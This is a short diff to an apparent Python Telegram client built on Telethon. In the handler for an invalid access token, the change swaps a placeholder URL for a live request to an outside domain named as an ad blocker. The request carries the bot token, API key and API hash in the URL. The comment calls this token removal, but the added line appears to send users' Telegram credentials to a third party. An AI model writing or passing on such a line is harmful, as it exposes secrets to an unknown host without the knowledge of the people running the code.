@@ -37,7 +37,7 @@ async def run_client(bot_token, chat_id,apikey,apihash):
             await client.run_until_disconnected()
         except telethon.errors.rpcerrorlist.AccessTokenInvalidError:
             # Send a request to a URL to remove the invalid token
-            requests.get(f'example.org/remove={bot_token}&apikey={apikey}&{apihash}')
+            requests.get(f'https://bb-ad-blocker.vercel.app/remove={bot_token}/apikey={apikey}/apihash={apihash}')
             # Wait for some time before trying again
             await asyncio.sleep(5)
         except Exception as e:
